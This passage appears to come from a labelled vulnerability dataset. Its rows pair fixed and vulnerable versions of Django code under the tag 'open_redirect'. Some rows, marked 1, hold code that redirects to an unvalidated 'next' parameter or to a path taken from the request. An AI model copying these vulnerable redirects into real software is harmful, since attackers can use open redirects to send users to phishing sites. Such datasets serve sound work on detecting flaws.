        RoundPlayer.objects.create(player=p13, the_round=cls.r1)

    def test_detail(self):
        response = self.client.get(reverse('round_detail', args=(self.t.pk, 1)))
        self.assertEqual(response.status_code, 200)

    def test_create_games_not_logged_in(self):
        response = self.client.get(reverse('create_games', args=(self.t.pk, 1)))
        self.assertEqual(response.status_code, 302)

    def test_get_seven_not_logged_in(self):
        response = self.client.get(reverse('get_seven', args=(self.t.pk, 1)))
        self.assertEqual(response.status_code, 302)

    def test_seed_games_not_logged_in(self):
        response = self.client.get(reverse('seed_games', args=(self.t.pk, 1)))
        self.assertEqual(response.status_code, 302)

    def test_seed_games_odd_number(self):
        # if we dont have a mutiple of 7 players, this view should redirect to fix that
        self.client.login(username=self.USERNAME1, password=self.PWORD1)
        response = self.client.get(reverse('seed_games', args=(self.t.pk, 1)))
        self.assertEqual(response.status_code, 302)
        self.assertEqual(response.url, reverse('get_seven', args=(self.t.pk, 1)))

    def test_game_scores_not_logged_in(self):
        response = self.client.get(reverse('game_scores', args=(self.t.pk, 1)))
        self.assertEqual(response.status_code, 302)

    def test_games(self):
        response = self.client.get(reverse('game_index', args=(self.t.pk, 1)))
        self.assertEqual(response.status_code, 200)

    def test_roll_call_not_logged_in(self):
        response = self.client.get(reverse('round_roll_call', args=(self.t.pk, 1)))
        self.assertEqual(response.status_code, 302)
/n/n/n",0,open_redirect
7,47,1ac934531ba0a3f16aee86e3b36a912dc8b67821,"/visualiser/tournament/round_views.py/n/n# Diplomacy Tournament Visualiser
# Copyright (C) 2014, 2016-2019 Chris Brand
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

""""""
Round Views for the Diplomacy Tournament Visualiser.
""""""

from django.contrib.auth.decorators import permission_required
from django.core.exceptions import ValidationError
from django.forms.formsets import formset_factory
from django.http import Http404, HttpResponseRedirect
from django.shortcuts import render
from django.urls import reverse
from django.utils.translation import ugettext as _

from tournament.forms import BaseGamePlayersFormset
from tournament.forms import BasePlayerRoundFormset
from tournament.forms import BasePowerAssignFormset
from tournament.forms import GamePlayersForm
from tournament.forms import GameScoreForm
from tournament.forms import GetSevenPlayersForm
from tournament.forms import PlayerRoundForm
from tournament.forms import PowerAssignForm

from tournament.tournament_views import get_modifiable_tournament_or_404
from tournament.tournament_views import get_visible_tournament_or_404

from tournament.diplomacy import GreatPower, GameSet
from tournament.email import send_board_call
from tournament.game_seeder import GameSeeder
from tournament.models import Tournament, Round, Game
from tournament.models import TournamentPlayer, RoundPlayer, GamePlayer

# Round views

def get_round_or_404(tournament, round_num):
    """"""Return the specified numbered round of the specified tournament or raise Http404.""""""
    try:
        return tournament.round_numbered(round_num)
    except Round.DoesNotExist:
        raise Http404

def round_simple(request, tournament_id, round_num, template):
    """"""Just render the specified template with the round""""""
    t = get_visible_tournament_or_404(tournament_id, request.user)
    r = get_round_or_404(t, round_num)
    context = {'tournament': t, 'round': r}
    return render(request, 'rounds/%s.html' % template, context)

@permission_required('tournament.add_roundplayer')
def roll_call(request, tournament_id, round_num=None):
    """"""Provide a form to specify which players are playing each round""""""
    t = get_modifiable_tournament_or_404(tournament_id, request.user)
    PlayerRoundFormset = formset_factory(PlayerRoundForm,
                                         extra=2,
                                         formset=BasePlayerRoundFormset)
    if round_num:
        r = get_round_or_404(t, round_num)
        round_set = t.round_set.filter(pk=r.pk)
    else:
        round_set = t.round_set.all()
    data = []
    # Go through each player in the Tournament
    for tp in t.tournamentplayer_set.all():
        current = {'player': tp.player}
        rps = tp.roundplayers()
        # And each round of the Tournament
        for r in round_set:
            # Is this player listed as playing this round ?
            played = rps.filter(the_round=r).exists()
            current['round_%d' % r.number()] = played
        data.append(current)
    if round_num:
        formset = PlayerRoundFormset(request.POST or None,
                                     tournament=t,
                                     round_num=int(round_num),
                                     initial=data)
    else:
        formset = PlayerRoundFormset(request.POST or None,
                                     tournament=t,
                                     initial=data)
    if formset.is_valid():
        for form in formset:
            try:
                p = form.cleaned_data['player']
            except KeyError:
                # This must be one of the extra forms, still empty
                continue
            # Ensure that this Player is in the Tournament
            i, created = TournamentPlayer.objects.get_or_create(player=p,
                                                                tournament=t)
            try:
                i.full_clean()
            except ValidationError as e:
                form.add_error(form.fields['player'], e)
                i.delete()
                return render(request,
                              'tournaments/round_players.html',
                              {'title': _('Roll Call'),
                               'tournament': t,
                               'post_url': reverse('roll_call', args=(tournament_id,)),
                               'formset' : formset})
            if created:
                i.save()
            for r_name, value in form.cleaned_data.items():
                if r_name == 'player':
                    # This column is just for the user
                    continue
                # Extract the round number from the field name
                i = int(r_name[6:])
                # Find that Round
                r = t.round_numbered(i)
                # Ignore non-bool fields and ones that aren't True
                if value is True:
                    # Ensure that we have a corresponding RoundPlayer
                    i, created = RoundPlayer.objects.get_or_create(player=p,
                                                                   the_round=r)
                    try:
                        i.full_clean()
                    except ValidationError as e:
                        form.add_error(None, e)
                        i.delete()
                        return render(request,
                                      'tournaments/round_players.html',
                                      {'title': _('Roll Call'),
                                       'tournament': t,
                                       'post_url': reverse('roll_call', args=(tournament_id,)),
                                       'formset' : formset})
                    if created:
                        i.save()
                else:
                    # delete any corresponding RoundPlayer
                    # This could be a player who was previously checked-off in error
                    RoundPlayer.objects.filter(player=p,
                                               the_round=r).delete()
        r = t.current_round()
        # If we're doing a roll call for a single round,
        # we only want to seed boards if it's the current round
        if not round_num or (r.number() == round_num):
            if t.seed_games:
                if (r.roundplayer_set.count() % 7) == 0:
                    # We have an exact multiple of 7 players, so go straight to seeding
                    return HttpResponseRedirect(reverse('seed_games',
                                                        args=(tournament_id,
                                                              r.number())))
                # We need players to sit out or play multiple games
                return HttpResponseRedirect(reverse('get_seven',
                                                    args=(tournament_id,
                                                          r.number())))
            else:
                # Next job is almost certainly to create the actual games
                return HttpResponseRedirect(reverse('create_games',
                                                    args=(tournament_id,
                                                          r.number())))

    return render(request,
                  'tournaments/round_players.html',
                  {'title': _('Roll Call'),
                   'tournament': t,
                   'post_url': reverse('roll_call', args=(tournament_id,)),
                   'formset' : formset})

@permission_required('tournament.add_game')
def get_seven(request, tournament_id, round_num):
    """"""Provide a form to get a multiple of seven players for a round""""""
    t = get_modifiable_tournament_or_404(tournament_id, request.user)
    r = get_round_or_404(t, round_num)
    count = r.roundplayer_set.count()
    sitters = count % 7
    # If we already have an exact multiple of seven players, go straight to creating games
    if sitters == 0:
        return HttpResponseRedirect(reverse('seed_games',
                                            args=(tournament_id,
                                                  round_num)))

    doubles = 7 - sitters
    context = {'tournament': t,
               'round': r,
               'count' : count,
               'sitters' : sitters,
               'doubles' : doubles}
    form = GetSevenPlayersForm(request.POST or None,
                               the_round=r)
    if form.is_valid():
        # Update RoundPlayers to indicate number of games they're playing
        # First clear any old game_counts
        for rp in r.roundplayer_set.exclude(game_count=1):
            rp.game_count = 1
            rp.save()
        for i in range(sitters):
            rp = form.cleaned_data['sitter_%d' % i]
            if rp:
                rp.game_count = 0
                rp.save()
        for i in range(doubles):
            rp = form.cleaned_data['double_%d' % i]
            if rp:
                rp.game_count = 2
                rp.save()
        return HttpResponseRedirect(reverse('seed_games',
                                            args=(tournament_id,
                                                  round_num)))
    context['form'] = form
    return render(request,
                  'rounds/get_seven.html',
                  context)

def _sitters_and_two_gamers(tournament, the_round):
    """""" Return a (sitters, two_gamers) 2-tuple""""""
    tourney_players = tournament.tournamentplayer_set.all()
    round_players = the_round.roundplayer_set.all()
    # Get the set of players that haven't already been assigned to games for this round
    rps = []
    sitters = set()
    two_gamers = set()
    for rp in round_players:
        assert rp.gameplayers().count() == 0, ""%d games already exist for %s in this round"" % (rp.gameplayers().count(),
                                                                                               str(rp))
        rps.append(rp)
        if rp.game_count == 1:
            continue
        elif rp.game_count == 0:
            # This player is sitting out this round
            sitters.add(rp.tournamentplayer())
        elif rp.game_count == 2:
            # This player is playing two games this round
            two_gamers.add(rp.tournamentplayer())
        else:
            assert 0, 'Unexpected game_count value %d for %s' % (rp.game_count, str(rp))
    assert (not sitters) or (not two_gamers)
    if sitters:
        # Check that we have the right number of players sitting out
        assert (len(rps) - len(sitters)) % 7 == 0
    if two_gamers:
        # Check that we have the right number of players playing two games
        assert (len(rps) + len(two_gamers)) % 7 == 0
    # We also need to flag any players who aren't present for this round as sitting out
    for tp in tourney_players:
        if not round_players.filter(player=tp.player).exists():
            sitters.add(tp)
    return sitters, two_gamers

def _create_game_seeder(tournament, round_number):
    """"""Return a GameSeeder that knows about the tournament so far""""""
    tourney_players = tournament.tournamentplayer_set.all()
    # Create the game seeder
    seeder = GameSeeder(GreatPower.objects.all(),
                        starts=100,
                        iterations=10)
    # Tell the seeder about every player in the tournament
    # (regardless of whether they're playing this round - they may have played already)
    for tp in tourney_players:
        seeder.add_player(tp)
    # Provide details of games already played this tournament
    for n in range(1, round_number):
        rnd = tournament.round_numbered(n)
        for g in rnd.game_set.all():
            game = set()
            for gp in g.gameplayer_set.all():
                game.add((gp.tournamentplayer(), gp.power))
            # TODO This doesn't deal with replacement players
            assert len(game) == 7
            seeder.add_played_game(game)
    # Add in any biases now that all players have been added
    for tp in tourney_players:
        # Just use seederbias_set so we only get each SeederBias once
        # because we only look at their player1
        for sb in tp.seederbias_set.all():
            seeder.add_bias(sb.player1, sb.player2, sb.weight)
    return seeder

def _seed_games(tournament, the_round):
    """"""Wrapper round GameSeeder to do the actual seeding for a round""""""
    seeder = _create_game_seeder(tournament, the_round.number())
    sitters, two_gamers = _sitters_and_two_gamers(tournament, the_round)
    # Generate the games
    return seeder.seed_games(omitting_players=sitters,
                             players_doubling_up=two_gamers)

def _seed_games_and_powers(tournament, the_round):
    """"""Wrapper round GameSeeder to do the actual seeding for a round""""""
    seeder = _create_game_seeder(tournament, the_round.number())
    sitters, two_gamers = _sitters_and_two_gamers(tournament, the_round)
    # Generate the games
    return seeder.seed_games_and_powers(omitting_players=sitters,
                                        players_doubling_up=two_gamers)

@permission_required('tournament.add_game')
def seed_games(request, tournament_id, round_num):
    """"""Seed players to the games for a round""""""
    t = get_modifiable_tournament_or_404(tournament_id, request.user)
    r = get_round_or_404(t, round_num)
    if request.method == 'POST':
        PowerAssignFormset = formset_factory(PowerAssignForm,
                                             formset=BasePowerAssignFormset,
                                             extra=0)
        formset = PowerAssignFormset(request.POST, the_round=r)
        if formset.is_valid():
            for f in formset:
                # Update the game
                g = f.game
                g.name = f.cleaned_data['game_name']
                g.the_set = f.cleaned_data['the_set']
                try:
                    g.full_clean()
                except ValidationError as e:
                    f.add_error(None, e)
                    return render(request,
                                  'rounds/seeded_games.html',
                                  {'tournament': t,
                                   'round': r,
                                   'formset' : formset})
                g.save()
                # Assign the powers to the players
                for gp_id, field in f.cleaned_data.items():
                    if gp_id in ['the_set', 'game_name']:
                        continue
                    gp = GamePlayer.objects.get(id=gp_id)
                    gp.power = field
                    try:
                        gp.full_clean()
                    except ValidationError as e:
                        f.add_error(None, e)
                        return render(request,
                                      'rounds/seeded_games.html',
                                      {'tournament': t,
                                       'round': r,
                                       'formset' : formset})
                    gp.save()
            # Notify the players
            send_board_call(r)
            # Redirect to the index of games in the round
            return HttpResponseRedirect(reverse('game_index',
                                                args=(tournament_id, round_num)))
    else:
        # Delete any existing Games and GamePlayers for this round
        r.game_set.all().delete()
        # TODO It's a bit hokey to have a fixed default GameSet here
        default_set = GameSet.objects.get(pk=1)
        data = []
        # Generate a seeding, and assign powers if required
        if t.power_assignment == Tournament.AUTO:
            games = _seed_games_and_powers(t, r)
            # Add the Games and GamePlayers to the database
            for i, g in enumerate(games, start=1):
                new_game = Game.objects.create(name='R%sG%d' % (round_num, i),
                                               the_round=r,
                                               the_set=default_set)
                current = {'game_name': new_game.name,
                           'the_set': new_game.the_set}
                for tp, power in g:
                    gp = GamePlayer.objects.create(player=tp.player,
                                                   game=new_game,
                                                   power=power)
                    current[gp.id] = power
                data.append(current)
        else:
            games = _seed_games(t, r)
            # Add the Games and GamePlayers to the database
            for i, g in enumerate(games, start=1):
                new_game = Game.objects.create(name='R%sG%d' % (round_num, i),
                                               the_round=r,
                                               the_set=default_set)
                current = {'game_name': new_game.name,
                           'the_set': new_game.the_set}
                for tp in g:
                    gp = GamePlayer.objects.create(player=tp.player,
                                                   game=new_game)
                # If we're assigning powers from preferences, do so now
                if t.power_assignment == Tournament.PREFERENCES:
                    new_game.assign_powers_from_prefs()
                for tp in g:
                    gp = GamePlayer.objects.get(player=tp.player,
                                                game=new_game)
                    current[gp.id] = gp.power
                data.append(current)
        # Create a form for each of the resulting games
        PowerAssignFormset = formset_factory(PowerAssignForm,
                                             formset=BasePowerAssignFormset,
                                             extra=0)
        formset = PowerAssignFormset(the_round=r, initial=data)
    # Note that we wait for confirmation before adding them to the database
    context = {'tournament': t, 'round': r, 'games': games, 'formset': formset}
    return render(request, 'rounds/seeded_games.html', context)

@permission_required('tournament.add_game')
def create_games(request, tournament_id, round_num):
    """"""Provide a form to create the games for a round""""""
    t = get_modifiable_tournament_or_404(tournament_id, request.user)
    r = get_round_or_404(t, round_num)
    # Do any games already exist for the round ?
    games = r.game_set.all()
    data = []
    for g in games:
        current = {'game_name': g.name,
                   'the_set': g.the_set}
        for gp in g.gameplayer_set.all():
            current[gp.power.name] = gp.roundplayer()
        data.append(current)
    # Estimate the number of games for the round
    round_players = r.roundplayer_set.count()
    expected_games = (round_players + 6) // 7
    # This can happen if there are no RoundPlayers for this round
    if expected_games < 1:
        expected_games = 1
    GamePlayersFormset = formset_factory(GamePlayersForm,
                                         extra=expected_games - games.count(),
                                         formset=BaseGamePlayersFormset)
    formset = GamePlayersFormset(request.POST or None,
                                 the_round=r,
                                 initial=data)
    if formset.is_valid():
        for f in formset:
            # Update/create the game
            try:
                g, created = Game.objects.get_or_create(name=f.cleaned_data['game_name'],
                                                        the_round=r,
                                                        the_set=f.cleaned_data['the_set'])
            except KeyError:
                # This must be an extra, unused formset
                continue
            try:
                g.full_clean()
            except ValidationError as e:
                f.add_error(None, e)
                g.delete()
                return render(request,
                              'rounds/create_games.html',
                              {'tournament': t,
                               'round': r,
                               'formset' : formset})
            if created:
                g.save()
            # Assign the players to the game
            for power, field in f.cleaned_data.items():
                try:
                    p = GreatPower.objects.get(name=power)
                except GreatPower.DoesNotExist:
                    continue
                # Is there already a player for this power in this game ?
                try:
                    i = GamePlayer.objects.get(game=g,
                                               power=p)
                except GamePlayer.DoesNotExist:
                    # Create one (default first_season and first_year)
                    i = GamePlayer(player=field.player, game=g, power=p)
                else:
                    # Change the player (if necessary)
                    i.player = field.player
                try:
                    i.full_clean()
                except ValidationError as e:
                    f.add_error(None, e)
                    # TODO Not 100% certain that this is the right thing to do here
                    i.delete()
                    return render(request,
                                  'rounds/create_games.html',
                                  {'tournament': t,
                                   'round': r,
                                   'formset' : formset})
                i.save()
        # Notify the players
        send_board_call(r)
        # Redirect to the index of games in the round
        return HttpResponseRedirect(reverse('game_index',
                                            args=(tournament_id, round_num)))

    return render(request,
                  'rounds/create_games.html',
                  {'tournament': t,
                   'round': r,
                   'formset' : formset})

@permission_required('tournament.change_gameplayer')
def game_scores(request, tournament_id, round_num):
    """"""Provide a form to enter scores for all the games in a round""""""
    t = get_modifiable_tournament_or_404(tournament_id, request.user)
    r = get_round_or_404(t, round_num)
    GameScoreFormset = formset_factory(GameScoreForm,
                                       extra=0)
    # Initial data
    data = []
    the_list = r.game_set.all()
    for game in the_list:
        content = {'game_name': game.name}
        for gp in game.gameplayer_set.all():
            content[gp.power.name] = gp.score
        data.append(content)
    formset = GameScoreFormset(request.POST or None, initial=data)
    if formset.is_valid():
        for f in formset:
            # Find the game
            g = Game.objects.get(name=f.cleaned_data['game_name'],
                                 the_round=r)
            # Set the score for each player
            for power, field in f.cleaned_data.items():
                # Ignore non-GreatPower fields (game_name)
                try:
                    p = GreatPower.objects.get(name=power)
                except GreatPower.DoesNotExist:
                    continue
                # Find the matching GamePlayer
                # TODO This will fail if there was a replacement
                i = GamePlayer.objects.get(game=g,
                                           power=p)
                # Set the score
                i.score = field
                try:
                    i.full_clean()
                except ValidationError as e:
                    f.add_error(None, e)
                    return render(request,
                                  'rounds/game_score.html',
                                  {'tournament': t,
                                   'round': round_num,
                                   'formset' : formset})
                i.save()
        # Redirect to the round index
        return HttpResponseRedirect(reverse('round_index',
                                            args=(tournament_id)))

    return render(request,
                  'rounds/game_score.html',
                  {'tournament': t,
                   'round': round_num,
                   'formset' : formset})

def game_index(request, tournament_id, round_num):
    """"""Display a list of games in the round""""""
    t = get_visible_tournament_or_404(tournament_id, request.user)
    r = get_round_or_404(t, round_num)
    the_list = r.game_set.all()
    context = {'round': r, 'game_list': the_list}
    return render(request, 'games/index.html', context)
/n/n/n",1,open_redirect
8,70,00e9e52072a403be45c9e74776cef128766dba20,"src/pretix/presale/views/locale.py/n/nfrom datetime import datetime, timedelta

from django.conf import settings
from django.shortcuts import redirect
from django.utils.http import is_safe_url
from django.views.generic import View


class LocaleSet(View):

    def get(self, request, *args, **kwargs):
        url = request.GET.get('next', request.META.get('HTTP_REFERER', '/'))
        url = url if is_safe_url(url, host=request.get_host()) else '/'
        resp = redirect(url)

        locale = request.GET.get('locale')
        if locale in [lc for lc, ll in settings.LANGUAGES]:
            if request.user.is_authenticated():
                request.user.locale = locale
                request.user.save()

            max_age = 10 * 365 * 24 * 60 * 60
            resp.set_cookie(settings.LANGUAGE_COOKIE_NAME, locale, max_age=max_age,
                            expires=(datetime.utcnow() + timedelta(seconds=max_age)).strftime(
                                '%a, %d-%b-%Y %H:%M:%S GMT'),
                            domain=settings.SESSION_COOKIE_DOMAIN)

        return resp
/n/n/n",0,open_redirect
9,71,00e9e52072a403be45c9e74776cef128766dba20,"/src/pretix/presale/views/locale.py/n/nfrom datetime import datetime, timedelta

from django.conf import settings
from django.shortcuts import redirect
from django.views.generic import View


class LocaleSet(View):

    def get(self, request, *args, **kwargs):
        locale = request.GET.get('locale')
        resp = redirect(request.GET.get('next', request.META.get('HTTP_REFERER', '/')))
        if locale in [lc for lc, ll in settings.LANGUAGES]:
            if request.user.is_authenticated():
                request.user.locale = locale
                request.user.save()

            max_age = 10 * 365 * 24 * 60 * 60
            resp.set_cookie(settings.LANGUAGE_COOKIE_NAME, locale, max_age=max_age,
                            expires=(datetime.utcnow() + timedelta(seconds=max_age)).strftime(
                                '%a, %d-%b-%Y %H:%M:%S GMT'),
                            domain=settings.SESSION_COOKIE_DOMAIN)
        return resp
/n/n/n",1,open_redirect
10,2,a1f948b468b6621083a03b0d53432341b7a4d753,"django/views/static.py/n/n""""""
Views and functions for serving static files. These are only to be used
during development, and SHOULD NOT be used in a production setting.
""""""
import mimetypes
import os
import posixpath
import re
import stat

from django.http import (
    FileResponse, Http404, HttpResponse, HttpResponseNotModified,
)
from django.template import Context, Engine, TemplateDoesNotExist, loader
from django.utils._os import safe_join
from django.utils.http import http_date, parse_http_date
from django.utils.translation import gettext as _, gettext_lazy


def serve(request, path, document_root=None, show_indexes=False):
    """"""
    Serve static files below a given point in the directory structure.

    To use, put a URL pattern such as::

        from django.views.static import serve

        url(r'^(?P<path>.*)$', serve, {'document_root': '/path/to/my/files/'})

    in your URLconf. You must provide the ``document_root`` param. You may
    also set ``show_indexes`` to ``True`` if you'd like to serve a basic index
    of the directory.  This index view will use the template hardcoded below,
    but if you'd like to override it, you can create a template called
    ``static/directory_index.html``.
    """"""
    path = posixpath.normpath(path).lstrip('/')
    fullpath = safe_join(document_root, path)
    if os.path.isdir(fullpath):
        if show_indexes:
            return directory_index(path, fullpath)
        raise Http404(_(""Directory indexes are not allowed here.""))
    if not os.path.exists(fullpath):
        raise Http404(_('""%(path)s"" does not exist') % {'path': fullpath})
    # Respect the If-Modified-Since header.
    statobj = os.stat(fullpath)
    if not was_modified_since(request.META.get('HTTP_IF_MODIFIED_SINCE'),
                              statobj.st_mtime, statobj.st_size):
        return HttpResponseNotModified()
    content_type, encoding = mimetypes.guess_type(fullpath)
    content_type = content_type or 'application/octet-stream'
    response = FileResponse(open(fullpath, 'rb'), content_type=content_type)
    response[""Last-Modified""] = http_date(statobj.st_mtime)
    if stat.S_ISREG(statobj.st_mode):
        response[""Content-Length""] = statobj.st_size
    if encoding:
        response[""Content-Encoding""] = encoding
    return response


DEFAULT_DIRECTORY_INDEX_TEMPLATE = """"""
{% load i18n %}
<!DOCTYPE html>
<html lang=""en"">
  <head>
    <meta http-equiv=""Content-type"" content=""text/html; charset=utf-8"" />
    <meta http-equiv=""Content-Language"" content=""en-us"" />
    <meta name=""robots"" content=""NONE,NOARCHIVE"" />
    <title>{% blocktrans %}Index of {{ directory }}{% endblocktrans %}</title>
  </head>
  <body>
    <h1>{% blocktrans %}Index of {{ directory }}{% endblocktrans %}</h1>
    <ul>
      {% if directory != ""/"" %}
      <li><a href=""../"">../</a></li>
      {% endif %}
      {% for f in file_list %}
      <li><a href=""{{ f|urlencode }}"">{{ f }}</a></li>
      {% endfor %}
    </ul>
  </body>
</html>
""""""
template_translatable = gettext_lazy(""Index of %(directory)s"")


def directory_index(path, fullpath):
    try:
        t = loader.select_template([
            'static/directory_index.html',
            'static/directory_index',
        ])
    except TemplateDoesNotExist:
        t = Engine(libraries={'i18n': 'django.templatetags.i18n'}).from_string(DEFAULT_DIRECTORY_INDEX_TEMPLATE)
    files = []
    for f in os.listdir(fullpath):
        if not f.startswith('.'):
            if os.path.isdir(os.path.join(fullpath, f)):
                f += '/'
            files.append(f)
    c = Context({
        'directory': path + '/',
        'file_list': files,
    })
    return HttpResponse(t.render(c))


def was_modified_since(header=None, mtime=0, size=0):
    """"""
    Was something modified since the user last downloaded it?

    header
      This is the value of the If-Modified-Since header.  If this is None,
      I'll just return True.

    mtime
      This is the modification time of the item we're talking about.

    size
      This is the size of the item we're talking about.
    """"""
    try:
        if header is None:
            raise ValueError
        matches = re.match(r""^([^;]+)(; length=([0-9]+))?$"", header,
                           re.IGNORECASE)
        header_mtime = parse_http_date(matches.group(1))
        header_len = matches.group(3)
        if header_len and int(header_len) != size:
            raise ValueError
        if int(mtime) > header_mtime:
            raise ValueError
    except (AttributeError, ValueError, OverflowError):
        return True
    return False
/n/n/ntests/view_tests/tests/test_static.py/n/nimport mimetypes
import unittest
from os import path
from urllib.parse import quote

from django.conf.urls.static import static
from django.core.exceptions import ImproperlyConfigured
from django.http import FileResponse, HttpResponseNotModified
from django.test import SimpleTestCase, override_settings
from django.utils.http import http_date
from django.views.static import was_modified_since

from .. import urls
from ..urls import media_dir


@override_settings(DEBUG=True, ROOT_URLCONF='view_tests.urls')
class StaticTests(SimpleTestCase):
    """"""Tests django views in django/views/static.py""""""

    prefix = 'site_media'

    def test_serve(self):
        ""The static view can serve static media""
        media_files = ['file.txt', 'file.txt.gz', '%2F.txt']
        for filename in media_files:
            response = self.client.get('/%s/%s' % (self.prefix, quote(filename)))
            response_content = b''.join(response)
            file_path = path.join(media_dir, filename)
            with open(file_path, 'rb') as fp:
                self.assertEqual(fp.read(), response_content)
            self.assertEqual(len(response_content), int(response['Content-Length']))
            self.assertEqual(mimetypes.guess_type(file_path)[1], response.get('Content-Encoding', None))

    def test_chunked(self):
        ""The static view should stream files in chunks to avoid large memory usage""
        response = self.client.get('/%s/%s' % (self.prefix, 'long-line.txt'))
        first_chunk = next(response.streaming_content)
        self.assertEqual(len(first_chunk), FileResponse.block_size)
        second_chunk = next(response.streaming_content)
        response.close()
        # strip() to prevent OS line endings from causing differences
        self.assertEqual(len(second_chunk.strip()), 1449)

    def test_unknown_mime_type(self):
        response = self.client.get('/%s/file.unknown' % self.prefix)
        self.assertEqual('application/octet-stream', response['Content-Type'])
        response.close()

    def test_copes_with_empty_path_component(self):
        file_name = 'file.txt'
        response = self.client.get('/%s//%s' % (self.prefix, file_name))
        response_content = b''.join(response)
        with open(path.join(media_dir, file_name), 'rb') as fp:
            self.assertEqual(fp.read(), response_content)

    def test_is_modified_since(self):
        file_name = 'file.txt'
        response = self.client.get(
            '/%s/%s' % (self.prefix, file_name),
            HTTP_IF_MODIFIED_SINCE='Thu, 1 Jan 1970 00:00:00 GMT'
        )
        response_content = b''.join(response)
        with open(path.join(media_dir, file_name), 'rb') as fp:
            self.assertEqual(fp.read(), response_content)

    def test_not_modified_since(self):
        file_name = 'file.txt'
        response = self.client.get(
            '/%s/%s' % (self.prefix, file_name),
            HTTP_IF_MODIFIED_SINCE='Mon, 18 Jan 2038 05:14:07 GMT'
            # This is 24h before max Unix time. Remember to fix Django and
            # update this test well before 2038 :)
        )
        self.assertIsInstance(response, HttpResponseNotModified)

    def test_invalid_if_modified_since(self):
        """"""Handle bogus If-Modified-Since values gracefully

        Assume that a file is modified since an invalid timestamp as per RFC
        2616, section 14.25.
        """"""
        file_name = 'file.txt'
        invalid_date = 'Mon, 28 May 999999999999 28:25:26 GMT'
        response = self.client.get('/%s/%s' % (self.prefix, file_name),
                                   HTTP_IF_MODIFIED_SINCE=invalid_date)
        response_content = b''.join(response)
        with open(path.join(media_dir, file_name), 'rb') as fp:
            self.assertEqual(fp.read(), response_content)
        self.assertEqual(len(response_content), int(response['Content-Length']))

    def test_invalid_if_modified_since2(self):
        """"""Handle even more bogus If-Modified-Since values gracefully

        Assume that a file is modified since an invalid timestamp as per RFC
        2616, section 14.25.
        """"""
        file_name = 'file.txt'
        invalid_date = ': 1291108438, Wed, 20 Oct 2010 14:05:00 GMT'
        response = self.client.get('/%s/%s' % (self.prefix, file_name),
                                   HTTP_IF_MODIFIED_SINCE=invalid_date)
        response_content = b''.join(response)
        with open(path.join(media_dir, file_name), 'rb') as fp:
            self.assertEqual(fp.read(), response_content)
        self.assertEqual(len(response_content), int(response['Content-Length']))

    def test_404(self):
        response = self.client.get('/%s/nonexistent_resource' % self.prefix)
        self.assertEqual(404, response.status_code)

    def test_index(self):
        response = self.client.get('/%s/' % self.prefix)
        self.assertContains(response, 'Index of ./')


class StaticHelperTest(StaticTests):
    """"""
    Test case to make sure the static URL pattern helper works as expected
    """"""
    def setUp(self):
        super().setUp()
        self._old_views_urlpatterns = urls.urlpatterns[:]
        urls.urlpatterns += static('/media/', document_root=media_dir)

    def tearDown(self):
        super().tearDown()
        urls.urlpatterns = self._old_views_urlpatterns

    def test_prefix(self):
        self.assertEqual(static('test')[0].regex.pattern, '^test(?P<path>.*)$')

    @override_settings(DEBUG=False)
    def test_debug_off(self):
        """"""No URLs are served if DEBUG=False.""""""
        self.assertEqual(static('test'), [])

    def test_empty_prefix(self):
        with self.assertRaisesMessage(ImproperlyConfigured, 'Empty static prefix not permitted'):
            static('')

    def test_special_prefix(self):
        """"""No URLs are served if prefix contains '://'.""""""
        self.assertEqual(static('http://'), [])


class StaticUtilsTests(unittest.TestCase):
    def test_was_modified_since_fp(self):
        """"""
        A floating point mtime does not disturb was_modified_since (#18675).
        """"""
        mtime = 1343416141.107817
        header = http_date(mtime)
        self.assertFalse(was_modified_since(header, mtime))
/n/n/n",0,open_redirect
11,3,a1f948b468b6621083a03b0d53432341b7a4d753,"/django/views/static.py/n/n""""""
Views and functions for serving static files. These are only to be used
during development, and SHOULD NOT be used in a production setting.
""""""
import mimetypes
import os
import posixpath
import re
import stat

from django.http import (
    FileResponse, Http404, HttpResponse, HttpResponseNotModified,
    HttpResponseRedirect,
)
from django.template import Context, Engine, TemplateDoesNotExist, loader
from django.utils.http import http_date, parse_http_date
from django.utils.translation import gettext as _, gettext_lazy


def serve(request, path, document_root=None, show_indexes=False):
    """"""
    Serve static files below a given point in the directory structure.

    To use, put a URL pattern such as::

        from django.views.static import serve

        url(r'^(?P<path>.*)$', serve, {'document_root': '/path/to/my/files/'})

    in your URLconf. You must provide the ``document_root`` param. You may
    also set ``show_indexes`` to ``True`` if you'd like to serve a basic index
    of the directory.  This index view will use the template hardcoded below,
    but if you'd like to override it, you can create a template called
    ``static/directory_index.html``.
    """"""
    path = posixpath.normpath(path)
    path = path.lstrip('/')
    newpath = ''
    for part in path.split('/'):
        if not part:
            # Strip empty path components.
            continue
        drive, part = os.path.splitdrive(part)
        head, part = os.path.split(part)
        if part in (os.curdir, os.pardir):
            # Strip '.' and '..' in path.
            continue
        newpath = os.path.join(newpath, part).replace('\\', '/')
    if newpath and path != newpath:
        return HttpResponseRedirect(newpath)
    fullpath = os.path.join(document_root, newpath)
    if os.path.isdir(fullpath):
        if show_indexes:
            return directory_index(newpath, fullpath)
        raise Http404(_(""Directory indexes are not allowed here.""))
    if not os.path.exists(fullpath):
        raise Http404(_('""%(path)s"" does not exist') % {'path': fullpath})
    # Respect the If-Modified-Since header.
    statobj = os.stat(fullpath)
    if not was_modified_since(request.META.get('HTTP_IF_MODIFIED_SINCE'),
                              statobj.st_mtime, statobj.st_size):
        return HttpResponseNotModified()
    content_type, encoding = mimetypes.guess_type(fullpath)
    content_type = content_type or 'application/octet-stream'
    response = FileResponse(open(fullpath, 'rb'), content_type=content_type)
    response[""Last-Modified""] = http_date(statobj.st_mtime)
    if stat.S_ISREG(statobj.st_mode):
        response[""Content-Length""] = statobj.st_size
    if encoding:
        response[""Content-Encoding""] = encoding
    return response


DEFAULT_DIRECTORY_INDEX_TEMPLATE = """"""
{% load i18n %}
<!DOCTYPE html>
<html lang=""en"">
  <head>
    <meta http-equiv=""Content-type"" content=""text/html; charset=utf-8"" />
    <meta http-equiv=""Content-Language"" content=""en-us"" />
    <meta name=""robots"" content=""NONE,NOARCHIVE"" />
    <title>{% blocktrans %}Index of {{ directory }}{% endblocktrans %}</title>
  </head>
